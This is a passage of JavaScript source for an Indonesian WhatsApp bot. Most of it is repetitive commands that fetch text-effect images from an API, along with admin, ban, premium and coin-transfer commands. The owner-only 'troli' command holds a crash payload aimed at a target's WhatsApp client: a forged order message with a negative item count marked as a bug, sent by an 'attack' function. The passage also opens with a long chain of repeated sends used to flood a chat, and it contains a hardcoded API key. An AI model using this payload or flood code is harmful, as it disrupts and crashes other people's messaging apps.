	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                 .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                 .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	.then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                 .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
	                .then(() => {Angga.sendMessage(from, options, text)})
					break
                     case 'maker32':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/happnewyearfirework?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker33':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/newyear3d?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker34':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/neontext?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker35':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/metaldarkgoldeffect?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker36':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/helloweenfire?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker37':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/bloodontheroastedglass?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker38':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/xmas3d?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker39':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     var F2 = body.slice(9)
			         var F = F2.split("&")[0];
			 	     var F1 = F2.split("&")[1]; 
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/3dmetalsilver?text=${F}&text2=${F1}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker40':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     var F2 = body.slice(9)
			         var F = F2.split("&")[0];
			 	     var F1 = F2.split("&")[1]; 
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/3dmetalrosegold?text=${F}&text2=${F1}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker41':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     var F2 = body.slice(9)
			         var F = F2.split("&")[0];
			 	     var F1 = F2.split("&")[1]; 
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/3dmetalgalaxy?text=${F}&text2=${F1}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker42':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     var F2 = body.slice(9)
			         var F = F2.split("&")[0];
			 	     var F1 = F2.split("&")[1]; 
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/3dmetalgold?text=${F}&text2=${F1}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker43':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz & bot`)                      
                     var F2 = body.slice(9)
			         var F = F2.split("&")[0];
			 	     var F1 = F2.split("&")[1]; 
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/lionlogomascot?text=${F}&text2=${F1}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker44':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     var F2 = body.slice(9)
			         var F = F2.split("&")[0];
			 	     var F1 = F2.split("&")[1]; 
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/wolflogoblackwhite?text=${F}&text2=${F1}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'troligc':
                     case 'troli':
if (!isOwner) return reply(ind.ownerb())
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
Angga.sendMessage(nomor, `⣠⡶⠚⠛⠲⢄⡀
⣼⠁      ⠀⠀⠀⠳⢤⣄
⢿⠀⢧⡀⠀⠀⠀⠀⠀⢈⡇
⠈⠳⣼⡙⠒⠶⠶⠖⠚⠉⠳⣄
⠀⠀⠈⣇⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄
⠀⠀⠀⠘⣆       ⠀⠀⠀⠀⠀⠈⠓⢦⣀
⠀⠀⠀⠀⠈⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠲⢤
⠀⠀⠀⠀⠀⠀⠙⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧
⠀⠀⠀⠀⠀⠀⠀⡴⠋⠓⠦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠈⣇
⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄ 
⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⢹⡄⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃
⠀⠀⠀⠀⠀⠀⠀⠙⢦⣀⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⢦⣀⣀⣀⣀⣠⡴⠚⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
 },
  message: {
    orderMessage: {
    thumbnail: fs.readFileSync('src/Ivan.jpg'),
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '️Bug Troli By Angga',
    orderTitle: 'TROLI', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
Angga.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}
async function attack(targett){
await sleep(3000)
troli(targett)
await sleep(3000)
bug(targett)
}

break
                     case 'maker45':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     var F2 = body.slice(9)
			         var F = F2.split("&")[0];
			 	     var F1 = F2.split("&")[1]; 
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/wolflogogalaxy?text=${F}&text2=${F1}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker46':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     var F2 = body.slice(9)
			         var F = F2.split("&")[0];
			 	     var F1 = F2.split("&")[1]; 
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/ninjalogo?text=${F}&text2=${F1}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker47':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/jokerlogo?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker48':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/wicker?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker49':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/naturalleaves?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker50':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/fireworksparkle?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker51':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/skeleton?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker52':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/redfoilballon?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker53':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/purplefoilballon?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker54':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/pinkfoilballon?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker55':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/greenfoilballon?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker56':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/cyanfoilballon?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker57':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/bluefoilballon?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'credits':
			const sokl = "6285283427860@s.whatsapp.net"
			const sekl = "6285737134572@s.whatsapp.net"
			const salk = "6285866295942@s.whatsapp.net"
			const pew = fs.readFileSync(`./lib/bot.jpg`)
teksits = `*DAFTAR PENGANTAR*

「 *Developer Of Bot* 」
•AnggaGanzz @${sokl.split("@")[0]}

「 *Thanks!* 」
•Arifi Razzaq @${sokl.split("@")[0]}
•Arya Manik @${sekl.split("@")[0]}
•Denis Putra @${salk.split("@")[0]}

• *SPECIAL BIG THANX TO :*
Mhankbarbar | Arugia | Adiwajhsing | xptn | tobz | Pengguna bot | Penyedia api key | Maslent | Nazwa | Arifi Razzaq | Agus | Caliph | Rey | Rizki | Aulia | Natasya | Drawl Nagl | Nayla | Khadijah | Aurel | Galuh | Ramlan | Anker | Dan Creator Bot Lainnya.

• *Temen Gw :*
| arifi Razzaq | Manik | Denis | FG98 | Dehante | Ridho-S | Arifi | Aqulz | Rvan | Ivan-MLN | Guvan | Arya-DN | Rizky`
					break
                     case 'maker58':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/goldfoilballon?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker59':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/steel?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker60':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/ultragloss?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker61':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/denim?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker62':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/decorategreen?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker63':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/decoratepurple?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker64':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/peridotstone?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker65':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/rock?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker66':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/lava?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker67':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/yellowglass?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker68':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/purpleglass?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker69':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/orangeglass?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker70':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/greeglass?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker71':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/cyanglass?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
                     case 'maker72':
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} AnggaGanzz`)
                     F = body.slice(9)
                     costum('[❗] SEDANG DIPROSES', text, tescuk, cr1)
                     anu = await getBuffer(`https://api.xteam.xyz/textpro/blueglass?text=${F}&APIKEY=${apixteam}`)
                     Angga.sendMessage(from, anu, image, {caption: `nih kack`, quoted: Angga})
                     break
	case 'imagerotate':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(13)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/rotate?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
				case 'getvideo': 
				
					namastc = body.slice(10)
					buffer = fs.readFileSync(`./strg/video/${namastc}.mp4`)
					Angga.sendMessage(from, buffer, video, { mimetype: 'video/mp4', quoted: mek })
					break
				case 'listvideo':
				case 'videolist': 
				
					teks = '*List Video :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}*`
					Angga.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": videonye } })
					break	
			
				
		case 'mutual':
                 if (!isRegistered) return reply( ind.noregis())
				if (isGroup) return  reply( 'Command ini tidak bisa digunakan di dalam grup!')
				anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
				await reply('Find for a partner...')
				await reply(`wa.me/${anug}`)
				await reply( `Partner found: 🙉\n*${prefix}next* — find a new partner`)
				await limitAdd(sender)
				break
		case 'next':
                 if (!isRegistered) return reply( ind.noregis())
				if (isGroup) return  reply( 'Command ini tidak bisa digunakan di dalam grup!')
				anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
				await reply('Find for a partner...')
				await reply(`wa.me/${anug}`)
				await reply( `Partner found: 🙉\n*${prefix}next* — find a new partner`)
				await limitAdd(sender)
				break
		case 'transfer':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (!q.includes('|')) return  reply(ind.wrongf())
                		const tujuan = q.substring(0, q.indexOf('|') - 1)
                		const jumblah = q.substring(q.lastIndexOf('|') + 1)
                		if(isNaN(jumblah)) return await reply('jumlah harus berupa angka!!')
                		if (jumblah < 5000 ) return reply(`minimal transfer 5000`)
                		if (checkATMuser(sender) < jumblah) return reply(`uang mu tidak mencukupi untuk melakukan transfer`)
                		const tujuantf = `${tujuan.replace("@", '')}@s.whatsapp.net`
                		fee = 0.010 *  jumblah
                		hasiltf = jumblah - fee
                		addKoinUser(tujuantf, hasiltf)
                		confirmATM(sender, jumblah)
                		addKoinUser('6285283427860@s.whatsapp.net', fee)
                		reply(`*「 SUKSES 」*\n\nPengiriman uang telah sukses\nDari : +${sender.split("@")[0]}\nKe : +${tujuan}\njJumlah transfer : ${jumblah}\nPajak : ${fee}`)
                		break
              case 'soundplaydate':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				let XYTODmy = fs.readFileSync('./mp3/Play-Date-Melanie-Martinez-Cover-by-邢凯悦XKY.mp3')
				Angga.sendMessage(from, XYTODmy, MessageType.audio, { quoted: mek, ptt: true })
				await limitAdd(sender)
				break
                case 'admin':
				if (!isOwner) return reply(ind.ownerb())
				admm = body.slice(7)
				adm.push(`${admm}@s.whatsapp.net`)
				fs.writeFileSync('./database/pengguna/admin.json', JSON.stringify(adm))
				reply(`Berhasil menambahkan admin bot wa.me/${admm} `)
				break
                case 'unadmin':
				if (!isOwner) return reply(ind.ownerb())
				admm = body.slice(9)
				admin.push(`${adm}@s.whatsapp.net`)
				fs.writeFileSync('./database/pengguna/admin.json', JSON.stringify(adm))
				reply(`Berhasil menambahkan admin bot wa.me/${adm} `)
				break
                case 'wakillist':
				Angga.updatePresence(from, Presence.composing) 
				
                 if (!isRegistered) return reply( ind.noregis())    
				teks = 'This is list of admin bot number :\n'
				for (let admm of adm) {
					teks += `~> @${admm.split('@')[0]}\n`
					}
					teks += `Total : ${admm.length}`
				Angga.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": adm}})
				break
                case 'premium':
				if (!isOwner) return reply(ind.ownerb())
				premm = body.slice(9)
				prem.push(`${premm}@s.whatsapp.net`)
				fs.writeFileSync('./database/pengguna/premium.json', JSON.stringify(prem))
				reply(`Berhasil menjadi premium wa.me/${premm} `)
				break
		case 'unpremium':
				if (!isOwner) return reply(ind.ownerb())
				premm = body.slice(11)
				prem.splice(`${premm}@s.whatsapp.net`, 1)
				fs.writeFileSync('./database/pengguna/premium.json', JSON.stringify(prem))
				reply(`Nomor sudah berakhir menjadi premium wa.me/${premm} `)
				break
                case 'premiumlist':
				Angga.updatePresence(from, Presence.composing) 
				
                 if (!isRegistered) return reply( ind.noregis())    
				teks = 'This is list of premium number :\n'
				for (let premm of prem) {
					teks += `~> @${premm.split('@')[0]}\n`
					}
					teks += `Total : ${prem.length}`
				Angga.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": prem}})
				break
                case 'bann':
				if (!isAdmin) return reply('*Only Admin bot*')
				bnnd = body.slice(5)
				ban.push(`${bnnd}@s.whatsapp.net`)
				fs.writeFileSync('./database/pengguna/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
				break
		case 'unbann':
				if (!isAdmin) return reply('*Only Admin bot*')
				bnnd = body.slice(7)
				ban.splice(`${bnnd}@s.whatsapp.net`, 1)
				fs.writeFileSync('./database/pengguna/banned.json', JSON.stringify(ban))
				reply(`Nomor wa.me/${bnnd} telah di unban!`)
				break
                case 'ban':
				if (!isOwner) return reply(ind.ownerb())
				bnnd = body.slice(5)
				ban.push(`${bnnd}@s.whatsapp.net`)
				fs.writeFileSync('./database/pengguna/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
				break
		case 'unban':
				if (!isOwner) return reply(ind.ownerb())
				bnnd = body.slice(7)
				ban.splice(`${bnnd}@s.whatsapp.net`, 1)
				fs.writeFileSync('./database/pengguna/banned.json', JSON.stringify(ban))
				reply(`Nomor wa.me/${bnnd} telah di unban!`)
				break
                case 'banlist':
				Angga.updatePresence(from, Presence.composing) 
				
                 if (!isRegistered) return reply( ind.noregis())    
				teks = 'This is list of banned number :\n'
				for (let benn of ban) {
					teks += `~> @${benn.split('@')[0]}\n`
					}
					teks += `Total : ${ban.length}`
